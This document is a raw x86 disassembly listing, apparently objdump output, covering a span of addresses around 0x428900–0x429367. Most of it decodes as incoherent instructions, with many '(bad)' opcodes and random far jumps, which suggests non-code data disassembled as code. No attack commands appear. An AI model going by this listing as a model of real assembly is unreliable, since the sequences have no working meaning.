  4288e6:	test   al,0xfc
  4288e8:	sub    BYTE PTR [ebp-0x20],bh
  4288eb:	add    DWORD PTR [ecx+0x30],ebx
	...
  428956:	es jp  0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi-0x2b62f1],bx
  428964:	ret    0x6714
  428967:	mov    bl,0x1
  428969:	add    BYTE PTR [eax],al
  42896b:	add    DWORD PTR [eax],eax
  42896d:	add    BYTE PTR ds:0xd8502023,bl
  428973:	sbb    al,BYTE PTR [ebp+0x1cfde049]
  428979:	cs push es
  42897b:	jle    0x42894f
  42897d:	xor    DWORD PTR [ecx+ebx*4],eax
  428980:	ss inc ecx
  428982:	dec    ecx
  428983:	lods   eax,DWORD PTR ds:[esi]
  428984:	inc    edx
  428985:	sbb    al,0x76
  428987:	jp     0x42898e
  428989:	ja     0x42898e
  42898b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42898c:	pop    es
  42898d:	xor    BYTE PTR [ebx+0x2d0fd7ab],bl
  428993:	jo     0x4289f1
  428995:	xor    al,0xa5
  428997:	aad    0x89
  428999:	lea    ecx,[ecx]
  42899b:	cmc    
  42899c:	daa    
  42899d:	jl     0x428a0e
  42899f:	cdq    
  4289a0:	(bad)  
  4289a1:	sbb    eax,0x9d2239e6
  4289a6:	xchg   ebx,eax
  4289a7:	fwait
  4289a8:	(bad)  
  4289a9:	mov    eax,ds:0x996db5cc
  4289ae:	mov    al,0x27
  4289b0:	sub    eax,0xbefcfbcd
  4289b5:	pop    es
  4289b6:	(bad)  
  4289b7:	test   bh,0x16
  4289ba:	sub    al,al
  4289bc:	hlt    
  4289bd:	jecxz  0x4289e3
  4289bf:	jl     0x428a05
  4289c1:	jmp    0x3d1bbd23
  4289c6:	push   ecx
  4289c7:	xor    eax,DWORD PTR [ecx]
  4289c9:	add    DWORD PTR [esi],ecx
  4289cb:	mov    bh,0xdd
  4289cd:	popa   
  4289ce:	iret   
  4289cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4289d0:	adc    al,0x95
  4289d2:	xchg   ebp,eax
  4289d3:	(bad)  
  4289d4:	mov    ?,ebx
  4289d6:	shl    BYTE PTR ds:0xbe6b2454,cl
  4289dc:	cmp    eax,0x1bc7769e
  4289e1:	test   DWORD PTR [edx-0x48d8f9d4],edi
  4289e7:	or     eax,0xa8cebec0
  4289ec:	(bad)  
  4289ed:	pusha  
  4289ee:	fadd   QWORD PTR [ebx]
  4289f0:	pop    edx
  4289f1:	je     0x4289a4
  4289f3:	sti    
  4289f4:	inc    edi
  4289f5:	and    bl,BYTE PTR [eax-0x20]
  4289f8:	jg     0x4289b1
  4289fa:	adc    dl,BYTE PTR [edx+ecx*8+0x4c2cdac6]
  428a01:	es dec ebp
  428a03:	jg     0x428a36
  428a05:	xor    BYTE PTR [ebx-0x707e9cc1],cl
  428a0b:	adc    DWORD PTR [ebx-0x7f1e0db7],esp
  428a11:	jbe    0x428a07
  428a13:	ret    
  428a14:	imul   ecx,DWORD PTR [ebp+ebx*8+0x43],0xffffffc2
  428a19:	repz pop ecx
  428a1b:	pushf  
  428a1c:	stos   DWORD PTR es:[edi],eax
  428a1d:	cmp    BYTE PTR [esi],ah
  428a1f:	push   ds
  428a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a21:	xlat   BYTE PTR ds:[ebx]
  428a22:	and    al,0x8a
  428a24:	or     eax,0x51dd13d1
  428a29:	imul   eax,DWORD PTR [ecx+0x48],0x5d
  428a2d:	sti    
  428a2e:	daa    
  428a2f:	sub    DWORD PTR [edx+0x2986aa2a],ebp
  428a35:	addr16 jo 0x428a56
  428a38:	jmp    0x8441:0xcec9003f
  428a3f:	out    dx,al
  428a40:	imul   edx,DWORD PTR [eax-0x37b85d07],0xa6610e03
  428a4a:	ins    DWORD PTR es:[edi],dx
  428a4b:	xchg   ecx,eax
  428a4c:	pop    edx
  428a4d:	fcom   QWORD PTR [edi+0x2b1af026]
  428a53:	lods   eax,DWORD PTR ds:[esi]
  428a54:	rcl    DWORD PTR [eax],0xc8
  428a57:	dec    esp
  428a58:	inc    eax
  428a59:	mov    ds,WORD PTR [edx-0x2ff79088]
  428a5f:	sub    ecx,ecx
  428a61:	cli    
  428a62:	std    
  428a63:	ret    0x2d07
  428a66:	cmp    al,0x7b
  428a68:	test   DWORD PTR [eax-0x4b],edx
  428a6b:	jbe    0x428a66
  428a6d:	inc    ecx
	...
  428ad6:	dec    ebp
  428ad7:	or     al,0xf8
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax-0x108609ed]
  428ae5:	ja     0x428b4e
  428ae7:	mov    ah,0x1
  428ae9:	add    BYTE PTR [eax],al
  428aeb:	add    DWORD PTR [eax],eax
  428aed:	add    BYTE PTR [eax+0x4c],al
  428af0:	inc    ecx
  428af1:	dec    ebp
  428af2:	mov    WORD PTR [edi-0x453f6936],ds
  428af8:	jnp    0x428b1d
  428afa:	outs   dx,DWORD PTR ds:[esi]
  428afb:	repnz push esp
  428afd:	repz mov cl,0x20
  428b00:	jo     0x428ad9
  428b02:	daa    
  428b03:	cmp    eax,0xd85d198d
  428b08:	je     0x428b3a
  428b0a:	and    edx,edi
  428b0c:	mov    WORD PTR [edi+0x8],cs
  428b0f:	dec    ebx
  428b10:	xor    al,BYTE PTR [edi+0x3]
  428b13:	mov    al,BYTE PTR [esi+0xf]
  428b16:	cwde   
  428b17:	or     DWORD PTR [ecx],esp
  428b19:	jnp    0x428b05
  428b1b:	jecxz  0x428b1a
  428b1d:	popf   
  428b1e:	es sbb al,0xd7
  428b21:	das    
  428b22:	dec    edx
  428b23:	and    eax,0xac22c1f2
  428b28:	pop    ss
  428b29:	pusha  
  428b2a:	mov    ds:0xe63ab19,eax
  428b2f:	sub    al,0xa
  428b31:	pop    edi
  428b32:	mov    bl,BYTE PTR [ecx]
  428b34:	push   cs
  428b35:	or     esi,eax
  428b37:	lea    ebp,[ebp-0x555e628a]
  428b3d:	jns    0x428b48
  428b3f:	mov    ebp,0xf39628c4
  428b44:	(bad)  
  428b45:	mov    cs:0xbb6318f6,eax
  428b4b:	pop    ds
  428b4c:	pop    eax
  428b4d:	dec    ebx
  428b4e:	outs   dx,BYTE PTR ds:[esi]
  428b4f:	pop    ds
  428b50:	pop    ebp
  428b51:	mov    dh,0x1
  428b53:	and    bl,BYTE PTR [edi+0x56be6782]
  428b59:	nop
  428b5a:	jmp    0x428b50
  428b5c:	ret    
  428b5d:	retf   0x7b4f
  428b60:	jge    0x428b47
  428b62:	xor    al,0x99
  428b64:	aam    0xb1
  428b66:	inc    esi
  428b67:	lods   al,BYTE PTR ds:[esi]
  428b68:	mov    eax,DWORD PTR [ecx+0x12]
  428b6b:	sub    eax,0x45930bab
  428b70:	nop
  428b71:	add    edi,DWORD PTR [eax+0x579473cb]
  428b77:	adc    DWORD PTR [edi],ebx
  428b79:	jne    0x428bbe
  428b7b:	imul   BYTE PTR [eax-0x18b39469]
  428b81:	sub    al,0x16
  428b83:	and    DWORD PTR [eax+edx*4],edi
  428b86:	jae    0x428b86
  428b88:	cmp    ebp,DWORD PTR [edx]
  428b8a:	cmp    eax,0xf5a93136
  428b8f:	push   eax
  428b90:	adc    al,dl
  428b92:	xor    DWORD PTR [esi+0x19bec099],eax
  428b98:	jbe    0x428b98
  428b9a:	add    eax,0x482c459
  428b9f:	push   ds
  428ba0:	aas    
  428ba1:	inc    ecx
  428ba2:	dec    esi
  428ba3:	lock sub bl,BYTE PTR [eax-0x2f94ed77]
  428baa:	daa    
  428bab:	(bad)  
  428bac:	ds push ebp
  428bae:	ins    DWORD PTR es:[edi],dx
  428baf:	(bad)  [ebx-0x4d]
  428bb2:	out    dx,eax
  428bb3:	sbb    bl,BYTE PTR [eax+ebp*1]
  428bb6:	movlps QWORD PTR [edx],xmm7
  428bb9:	inc    edi
  428bba:	push   ds
  428bbb:	xor    ebp,ebx
  428bbd:	mov    eax,0x1d05ec3d
  428bc2:	mov    al,ds:0xd3bb82c6
  428bc7:	jg     0x428b98
  428bc9:	or     edx,DWORD PTR [ecx+0x3f]
  428bcc:	xchg   DWORD PTR [ebx-0x65],esi
  428bcf:	(bad)  
  428bd0:	test   eax,0x917bbb84
  428bd5:	cli    
  428bd6:	bound  ecx,QWORD PTR [edx]
  428bd8:	pop    es
  428bd9:	sub    DWORD PTR ds:0xb6573f7d,esi
  428bdf:	add    eax,0x35cf31c
  428be4:	adc    eax,0xb4bf7cc5
  428be9:	inc    esi
  428bea:	dec    ebp
  428beb:	imul   eax,DWORD PTR [eax],0xffffffc3
	...
  428c56:	lds    edx,FWORD PTR [ebp-0x76]
  428c59:	cli    
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0x23265efa
  428c66:	addr16 mov ch,0x1
  428c69:	add    BYTE PTR [eax],al
  428c6b:	add    DWORD PTR [eax],eax
  428c6d:	add    dh,dh
  428c6f:	add    eax,0xcab9b639
  428c74:	lods   al,BYTE PTR ds:[esi]
  428c75:	aaa    
  428c76:	add    di,WORD PTR [ecx+ecx*1-0x69702377]
  428c7e:	out    dx,eax
  428c7f:	mov    edi,0xb2acdcfd
  428c84:	mov    ds:0x25064918,eax
  428c89:	adc    al,0x11
  428c8b:	push   eax
  428c8c:	dec    edi
  428c8d:	sti    
  428c8e:	jp     0x428c5f
  428c90:	test   BYTE PTR es:[ebx-0x80],ch
  428c94:	mov    ds,ebp
  428c96:	mov    DWORD PTR [edx],edi
  428c98:	sti    
  428c99:	xchg   ebx,eax
  428c9a:	cmp    DWORD PTR [esi],ebp
  428c9c:	xchg   bh,bh
  428c9e:	sub    DWORD PTR ds:0xaa8881a0,eax
  428ca4:	clc    
  428ca5:	cmp    eax,0xf3c6a206
  428caa:	pop    ebp
  428cab:	int3   
  428cac:	pop    ecx
  428cad:	push   ebx
  428cae:	rcl    DWORD PTR [ebx],cl
  428cb0:	jge    0x428c4e
  428cb2:	addr16 xor ah,cl
  428cb5:	aaa    
  428cb6:	dec    esp
  428cb7:	test   DWORD PTR [eax+0x524bd272],0x2469bc75
  428cc1:	or     cl,dh
  428cc3:	ret    0xe7a6
  428cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428cc7:	sbb    ebx,DWORD PTR [esp+ecx*8]
  428cca:	or     DWORD PTR [esi+0x2046e798],ebp
  428cd0:	inc    eax
  428cd1:	shr    BYTE PTR [bp+di],1
  428cd4:	mov    ds:0x9fb6d6c6,al
  428cd9:	test   al,0x6b
  428cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428cdc:	sub    al,0xf0
  428cde:	dec    ebx
  428cdf:	xor    esp,DWORD PTR [esi]
  428ce1:	ret    
  428ce2:	aad    0x3
  428ce4:	mov    eax,ds:0x41a9d647
  428ce9:	aad    0xfd
  428ceb:	pop    ss
  428cec:	rcr    DWORD PTR [edx+ecx*8-0x4aa268cc],1
  428cf3:	imul   ebx,DWORD PTR [esi-0x8],0xf
  428cf7:	outs   dx,BYTE PTR ds:[esi]
  428cf8:	aam    0x51
  428cfa:	pop    eax
  428cfb:	les    esp,FWORD PTR [esi]
  428cfd:	mov    fs,WORD PTR [ecx]
  428cff:	sub    al,0xb5
  428d01:	es xchg edi,eax
  428d03:	mov    bh,0x43
  428d05:	mov    dh,0x1b
  428d07:	sub    bh,BYTE PTR [ecx+0x17]
  428d0a:	sub    al,0x52
  428d0c:	lock adc esi,edx
  428d0f:	pop    esi
  428d10:	sub    eax,0x8a395093
  428d15:	dec    ecx
  428d16:	xor    BYTE PTR [ebx],bh
  428d18:	jge    0x428d58
  428d1a:	adc    dh,BYTE PTR [edx-0x334aee29]
  428d20:	pop    esi
  428d21:	sar    DWORD PTR [ecx-0x1a],cl
  428d24:	adc    edi,DWORD PTR [ebp+0x4c]
  428d27:	mov    ch,0x50
  428d29:	pop    esp
  428d2a:	repnz ins BYTE PTR es:[edi],dx
  428d2c:	cmp    BYTE PTR [ebx-0x6d25ea48],bh
  428d32:	fucom  st(3)
  428d34:	or     ebx,eax
  428d36:	or     al,0x5e
  428d38:	xchg   DWORD PTR [ebp-0xeae0391],ecx
  428d3e:	rcr    DWORD PTR [edi+eax*8+0x1e09c200],1
  428d45:	xor    BYTE PTR [edi+ebx*8-0x220d2e9],bh
  428d4c:	mov    edx,0x4f1076cb
  428d51:	mov    bl,0xd6
  428d53:	jl     0x428d99
  428d55:	leave  
  428d56:	mov    edi,0x9034b8e6
  428d5b:	addr16 sti 
  428d5d:	test   al,0x4
  428d5f:	xchg   BYTE PTR [esi+0x4e],bl
  428d62:	(bad)  
  428d63:	test   eax,0xa6f4ea9b
  428d68:	iret   
  428d69:	sub    ebx,DWORD PTR [esi+0x12]
  428d6c:	xor    eax,0xac
	...
  428dd5:	add    BYTE PTR [ecx-0xace0e4b],al
  428ddb:	jne    0x428d9e
  428ddd:	mov    ch,0x90
  428ddf:	int3   
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0x34c8
  428de4:	push   esi
  428de5:	cmp    DWORD PTR [edi-0x4a],esp
  428de8:	add    DWORD PTR [eax],eax
  428dea:	add    BYTE PTR [ecx],al
  428dec:	add    BYTE PTR [eax],al
  428dee:	mov    cl,0x1d
  428df0:	dec    edi
  428df1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428df2:	hlt    
  428df3:	pusha  
  428df4:	js     0x428e2d
  428df6:	test   BYTE PTR [ebp+0x773e7208],dl
  428dfc:	leave  
  428dfd:	mov    al,0xc6
  428dff:	dec    BYTE PTR [esi+0x4887744a]
  428e05:	pop    es
  428e06:	mov    bh,dh
  428e08:	cmp    edi,DWORD PTR [ebx-0x3133298a]
  428e0e:	push   ecx
  428e0f:	jmp    0x428dde
  428e11:	xchg   DWORD PTR [ebp+0xb],edi
  428e14:	mov    ebx,0xe350836a
  428e19:	rcr    BYTE PTR [ebx+0x2db77b98],1
  428e1f:	add    ecx,ebp
  428e21:	aas    
  428e22:	adc    DWORD PTR [ecx],eax
  428e24:	out    0xa7,eax
  428e26:	and    ebx,DWORD PTR [esi]
  428e28:	add    eax,0x2980d256
  428e2d:	or     eax,0xc9bf1c7f
  428e32:	add    eax,0x225875ed
  428e37:	or     ax,0x451c
  428e3b:	in     al,0xb1
  428e3d:	sti    
  428e3e:	or     dl,ah
  428e40:	fxch   st(1)
  428e42:	dec    ebx
  428e43:	aas    
  428e44:	xor    BYTE PTR [ecx],ah
  428e46:	mov    al,bh
  428e48:	popf   
  428e49:	stos   BYTE PTR es:[edi],al
  428e4a:	mov    ds:0x37e2aeee,al
  428e4f:	mov    ebp,DWORD PTR [eax]
  428e51:	ret    0xcd23
  428e54:	mov    cs,WORD PTR [esi+0x51]
  428e57:	bound  esi,QWORD PTR [edx]
  428e59:	(bad)  
  428e5a:	sbb    eax,0x78485afb
  428e5f:	jmp    0x1e00:0x3953032c
  428e66:	push   DWORD PTR [ebp-0x26513d44]
  428e6c:	rcr    BYTE PTR [ebp+eiz*1-0x15],0xcd
  428e71:	ror    BYTE PTR [edx],0x11
  428e74:	js     0x428ead
  428e76:	(bad)  
  428e77:	mov    BYTE PTR [ecx+0x7ab39ec4],bl
  428e7d:	jmp    0x9de9:0x68a3fa68
  428e84:	mov    dh,BYTE PTR [ebx+0x5e5dd646]
  428e8a:	pop    ebx
  428e8b:	push   0xfde5788e
  428e90:	xchg   edx,eax
  428e91:	pop    esp
  428e92:	(bad)  
  428e93:	mov    bh,0xfb
  428e95:	and    eax,0x51f44e16
  428e9a:	mov    edx,DWORD PTR [eax-0x32]
  428e9d:	or     esi,ebp
  428e9f:	enter  0x803,0xaa
  428ea3:	mov    ebp,esi
  428ea5:	sbb    ebp,DWORD PTR [edx]
  428ea7:	fcmovnb st,st(5)
  428ea9:	add    esi,ebx
  428eab:	enter  0x851f,0x95
  428eaf:	xchg   ebp,eax
  428eb0:	xchg   ecx,eax
  428eb1:	call   0xf6000569
  428eb6:	out    dx,eax
  428eb7:	jge    0x428eaf
  428eb9:	mov    eax,ds:0xf37be221
  428ebe:	ror    DWORD PTR [eax],1
  428ec0:	fstp   st(3)
  428ec2:	push   ss
  428ec3:	adc    DWORD PTR [edx+0x2c],0x7a
  428ec7:	fmul   DWORD PTR [ebx+edx*4+0x5]
  428ecb:	cmc    
  428ecc:	push   esp
  428ecd:	adc    ecx,edx
  428ecf:	ficomp WORD PTR [edx+0x60e9668b]
  428ed5:	and    ecx,edx
  428ed7:	loop   0x428ed8
  428ed9:	push   esp
  428eda:	bound  esp,QWORD PTR [ebp+0x1b4138b4]
  428ee0:	shl    DWORD PTR [eax+0x2f93cec7],1
  428ee6:	mov    ds:0x1370ef60,al
  428eeb:	dec    ebp
  428eec:	retf   0x82
	...
  428f53:	add    BYTE PTR [eax],al
  428f55:	add    BYTE PTR [edi+0x5d],cl
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0x2e
  428f63:	xor    ebx,DWORD PTR [ebp+0x71]
  428f66:	addr16 mov bh,0x1
  428f69:	add    BYTE PTR [eax],al
  428f6b:	add    DWORD PTR [eax],eax
  428f6d:	add    BYTE PTR [esp+eax*2+0x55cc3dfd],cl
  428f74:	xchg   edi,eax
  428f75:	retf   0x1601
  428f78:	jnp    0x428f27
  428f7a:	add    bh,BYTE PTR [ecx-0x73]
  428f7d:	sbb    ecx,0xffffffad
  428f80:	mov    bl,0x33
  428f82:	mov    eax,edi
  428f84:	jnp    0x429005
  428f86:	mov    ds:0x21bb4940,al
  428f8b:	mov    WORD PTR [ebp-0x6f],?
  428f8e:	xchg   esp,eax
  428f8f:	xor    eax,0x7638f013
  428f94:	(bad)  
  428f95:	mov    ds:0x28bb77e1,eax
  428f9a:	inc    ebx
  428f9b:	sub    al,BYTE PTR [eax]
  428f9d:	xor    al,0x4f
  428f9f:	fdiv   DWORD PTR [eax+0x29]
  428fa2:	pop    ecx
  428fa3:	dec    ebx
  428fa4:	inc    ebp
  428fa5:	fsub   st(6),st
  428fa7:	cdq    
  428fa8:	(bad)  
  428fa9:	mov    cl,0x7b
  428fab:	stc    
  428fac:	xor    cl,bh
  428fae:	rol    DWORD PTR [edx-0x80],cl
  428fb1:	xchg   ebx,eax
  428fb2:	inc    eax
  428fb3:	test   DWORD PTR [ecx+0x5e],edi
  428fb6:	nop
  428fb7:	mov    WORD PTR [ebx-0x2899f44],ss
  428fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fbe:	hlt    
  428fbf:	dec    ebx
  428fc0:	lds    edi,FWORD PTR [ebp-0xb]
  428fc3:	ds xchg ebx,eax
  428fc5:	xchg   edx,eax
  428fc6:	test   al,0x85
  428fc8:	add    esi,ebp
  428fca:	lods   al,BYTE PTR ds:[esi]
  428fcb:	test   BYTE PTR [edx],al
  428fcd:	mov    bl,0x94
  428fcf:	adc    DWORD PTR [ebx],ecx
  428fd1:	jg     0x428f86
  428fd3:	sub    esp,esi
  428fd5:	cmp    al,0xef
  428fd7:	(bad)  
  428fd8:	jmp    0x428f89
  428fda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fdb:	or     ecx,DWORD PTR [ecx-0x3f8c3588]
  428fe1:	pop    esp
  428fe2:	jp     0x429005
  428fe4:	outs   dx,DWORD PTR ds:[esi]
  428fe5:	ins    DWORD PTR es:[edi],dx
  428fe6:	out    0xe4,eax
  428fe8:	adc    al,0x43
  428fea:	xor    al,0x1c
  428fec:	dec    edi
  428fed:	mov    ebp,0xc5f17a2f
  428ff2:	enter  0xb527,0xf7
  428ff6:	fstp   DWORD PTR [edi]
  428ff8:	inc    esp
  428ff9:	dec    ebp
  428ffa:	push   eax
  428ffb:	das    
  428ffc:	repnz in al,0xdd
  428fff:	out    dx,al
  429000:	ret    
  429001:	ss aas 
  429003:	push   eax
  429004:	(bad)  
  429005:	xchg   BYTE PTR ds:0x334853a6,bl
  42900b:	ret    0x26d0
  42900e:	push   eax
  42900f:	and    ebp,DWORD PTR [ebp+0x2c271c12]
  429015:	or     DWORD PTR ds:0x971779eb,0x84077c4e
  42901f:	dec    esi
  429020:	sti    
  429021:	fisubr DWORD PTR [ecx-0x43576fdc]
  429027:	mov    edi,0xebc53641
  42902c:	or     dl,BYTE PTR [edx]
  42902e:	mov    ds:0x21d3a0c3,al
  429033:	sub    eax,0x5a86c6b8
  429038:	xchg   ebp,eax
  429039:	add    al,0xf9
  42903b:	and    al,0xe2
  42903d:	and    DWORD PTR [ebp-0x22],ebp
  429040:	mov    es,WORD PTR [ecx]
  429042:	(bad)  
  429044:	add    DWORD PTR [eax],esi
  429046:	cdq    
  429047:	dec    ecx
  429048:	push   ebp
  429049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42904a:	jecxz  0x42905f
  42904c:	test   eax,0x1fcd775d
  429051:	outs   dx,BYTE PTR ds:[esi]
  429052:	xchg   esi,eax
  429053:	arpl   WORD PTR [eax+0x2626cffc],bx
  429059:	push   0x825f29c9
  42905e:	fs jl  0x429039
  429061:	inc    edi
  429062:	mov    ebx,0x2e806a99
  429067:	repz jmp 0xa6ff1bb6
  42906d:	mov    DWORD PTR [eax],eax
	...
  4290d3:	add    BYTE PTR [eax],al
  4290d5:	add    cl,ah
  4290d7:	in     al,dx
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0x3efc7b77
  4290e3:	and    ebp,DWORD PTR [esi+0x2f]
  4290e6:	addr16 mov eax,0x1000001
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	mov    al,ds:0x3725f8fd
  4290f3:	shl    ah,cl
  4290f5:	pop    ss
  4290f6:	mov    ds:0x873c1d2d,al
  4290fb:	push   es
  4290fc:	xor    DWORD PTR [ebp-0x19add574],esp
  429102:	mov    edi,0x87145110
  429107:	sbb    esp,DWORD PTR [ebp+0x24]
  42910a:	mov    ds:0xafa81bb3,eax
  42910f:	pushf  
  429110:	pop    eax
  429111:	rol    DWORD PTR [eax-0x57],cl
  429114:	test   BYTE PTR [esi-0x38],bl
  429117:	stos   DWORD PTR es:[edi],eax
  429118:	xor    BYTE PTR gs:[ebx],0xbc
  42911c:	fcom   DWORD PTR [ebp+ecx*4-0x61]
  429120:	push   es
  429121:	mov    ds:0xfb586e18,eax
  429126:	or     BYTE PTR [ebx+0x4a],0xe2
  42912a:	mov    dh,BYTE PTR [eax]
  42912c:	inc    ebp
  42912d:	imul   BYTE PTR [eax+0x4f55e819]
  429133:	in     eax,dx
  429134:	inc    edx
  429135:	js     0x4290b9
  429137:	scas   al,BYTE PTR es:[edi]
  429138:	call   WORD PTR [esi*2+0x3d03bb79]
  429140:	das    
  429141:	adc    BYTE PTR [ebx],bl
  429143:	fiadd  WORD PTR [esp+ebp*8+0x71]
  429147:	dec    eax
  429148:	push   ss
  429149:	(bad)  
  42914a:	shl    bh,1
  42914c:	xlat   BYTE PTR ds:[ebx]
  42914d:	out    dx,al
  42914e:	xor    al,0x85
  429150:	neg    DWORD PTR [edi]
  429152:	and    cl,BYTE PTR [ecx+ecx*8]
  429155:	mov    DWORD PTR [ebx+0xe],edx
  429158:	or     ecx,DWORD PTR [ebx-0x23]
  42915b:	adc    BYTE PTR [ebx*2-0x13660772],al
  429162:	sahf   
  429163:	inc    esi
  429164:	rol    BYTE PTR [ebp-0x19f01a83],0xba
  42916b:	pop    es
  42916c:	lahf   
  42916d:	dec    edx
  42916e:	pop    ebx
  42916f:	xchg   eax,eax
  429171:	stc    
  429172:	dec    BYTE PTR [edx-0x48]
  429175:	inc    BYTE PTR [esi+esi*8]
  429178:	daa    
  429179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42917a:	xchg   esp,eax
  42917b:	jecxz  0x429192
  42917d:	cmp    ebx,DWORD PTR [edx-0x7a]
  429180:	stc    
  429181:	pushf  
  429182:	mov    eax,DWORD PTR [edi+0x26]
  429185:	ror    BYTE PTR [edi-0x5e],cl
  429188:	jmp    0x94911ad0
  42918d:	and    DWORD PTR [edx],ecx
  42918f:	jmp    0xf191:0x89670181
  429196:	push   ss
  429197:	mov    esp,0x7e399844
  42919c:	shl    DWORD PTR [edi+0x666cd5b7],cl
  4291a2:	sbb    DWORD PTR [ebp-0x64],ebp
  4291a5:	pop    ebx
  4291a6:	in     eax,dx
  4291a7:	scas   al,BYTE PTR es:[edi]
  4291a8:	and    DWORD PTR [esi],esp
  4291aa:	adc    bl,BYTE PTR [eax+0x61]
  4291ad:	add    eax,0xd24e79c8
  4291b2:	loop   0x429143
  4291b4:	push   ebx
  4291b5:	out    0x45,eax
  4291b7:	cmp    eax,0x731d1acc
  4291bc:	xor    esi,esi
  4291be:	and    BYTE PTR [ebp+0x73],0x39
  4291c2:	into   
  4291c3:	pop    esi
  4291c4:	xor    edx,0x39
  4291c7:	in     al,0x42
  4291c9:	int3   
  4291ca:	adc    eax,0x2b8a3a87
  4291cf:	sub    dh,BYTE PTR [eax+ecx*8]
  4291d2:	jl     0x4291cd
  4291d4:	push   eax
  4291d5:	cmp    eax,0xd99a0123
  4291da:	jp     0x4291d5
  4291dc:	cmp    al,0xf0
  4291de:	cmp    dl,al
  4291e0:	das    
  4291e1:	mov    esp,0x6ba62ea2
  4291e6:	in     al,dx
  4291e7:	add    dh,BYTE PTR [edx-0x7593301a]
  4291ed:	popa   
	...
  429256:	push   esi
  429257:	xchg   ebp,edi
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [esi+ecx*2+0x67bf4933],0x1b9
  42926b:	add    DWORD PTR [eax],eax
  42926d:	add    dh,bh
  42926f:	not    BYTE PTR [esi]
  429271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429272:	loop   0x4292df
  429274:	and    eax,0x4c7cff5f
  429279:	cli    
  42927a:	fnsave [ecx]
  42927c:	mov    bl,0xa4
  42927e:	js     0x429206
  429280:	inc    ebp
  429281:	hlt    
  429282:	xor    BYTE PTR [esi+0x75],0xd4
  429286:	retf   
  429287:	cmp    dh,bl
  429289:	repnz push cs
  42928b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42928c:	adc    ch,BYTE PTR [ecx]
  42928e:	pop    ebp
  42928f:	xor    BYTE PTR [edi-0x44c788d7],ah
  429295:	jmp    0xc9ca:0xb2d10fa7
  42929c:	ins    BYTE PTR es:[edi],dx
  42929d:	mov    ecx,0x8dc2da1d
  4292a2:	dec    edi
  4292a3:	add    BYTE PTR ds:0xdbbe9f6e,bh
  4292a9:	aad    0xde
  4292ab:	and    eax,0xbc1414bb
  4292b0:	rol    DWORD PTR [ecx],1
  4292b2:	and    BYTE PTR [eax],al
  4292b4:	inc    ecx
  4292b5:	jmp    0x30ac09ce
  4292ba:	mov    ch,0x35
  4292bc:	hlt    
  4292bd:	pop    ss
  4292be:	or     al,0xda
  4292c0:	in     eax,0x72
  4292c2:	xchg   edx,eax
  4292c3:	mov    ds:0x7601b680,eax
  4292c8:	shl    DWORD PTR [ebp-0x57f30a84],1
  4292ce:	and    ebx,DWORD PTR [ebx]
  4292d0:	jae    0x4292f4
  4292d2:	int3   
  4292d3:	(bad)  
  4292d4:	addr16 pop edi
  4292d6:	push   ss
  4292d7:	adc    BYTE PTR [ebx+ebp*1+0x5e],ah
  4292db:	mov    esi,DWORD PTR [ebx+0x4a]
  4292de:	jnp    0xfbe44c27
  4292e4:	frstor [esi]
  4292e6:	xchg   edi,eax
  4292e7:	sbb    eax,0x60fa7c27
  4292ec:	adc    eax,0x737478f9
  4292f1:	sub    cl,BYTE PTR [ebx+0x3f9940ad]
  4292f7:	mov    eax,ds:0x20211657
  4292fc:	nop
  4292fd:	cmp    dh,cl
  4292ff:	sub    eax,0xf952b0fd
  429304:	xlat   BYTE PTR ds:[ebx]
  429305:	cdq    
  429306:	or     al,0xba
  429308:	dec    edi
  429309:	das    
  42930a:	mov    eax,DWORD PTR [esi]
  42930c:	out    dx,al
  42930d:	lods   eax,DWORD PTR ds:[esi]
  42930e:	mov    eax,DWORD PTR ds:0x72134bc8
  429314:	mov    ah,0x29
  429316:	mov    WORD PTR [edi-0x72e7f5a7],gs
  42931c:	icebp  
  42931d:	and    BYTE PTR [edi+0x2016a898],0xf9
  429324:	ins    DWORD PTR es:[edi],dx
  429325:	sub    bh,dl
  429327:	mov    cl,0x62
  429329:	lock adc DWORD PTR [edx],esi
  42932c:	jmp    0x42937f
  42932e:	xor    esp,edx
  429330:	adc    BYTE PTR [esi],0x31
  429333:	or     DWORD PTR [ebx],ecx
  429335:	in     eax,dx
  429336:	sub    al,BYTE PTR [ebx-0x794eb95c]
  42933c:	(bad)  
  42933d:	rcr    BYTE PTR [ebp-0x3f],cl
  429340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429341:	lea    esi,[esi-0x6a57680d]
  429347:	or     edi,esp
  429349:	rcl    ah,0x30
  42934c:	ss mov cl,0xf5
  42934f:	nop
  429350:	mov    bh,0x56
  429352:	stos   BYTE PTR es:[edi],al
  429353:	pop    ss
  429354:	ficom  DWORD PTR [ecx+0x16]
  429357:	ss clc 
  429359:	call   0xdadc5675
  42935e:	lods   eax,DWORD PTR ds:[esi]
  42935f:	xchg   ebp,eax
  429360:	clc    
  429361:	cmp    BYTE PTR es:[esi],bl
  429364:	repz adc esi,edx
  429367:	push   edx
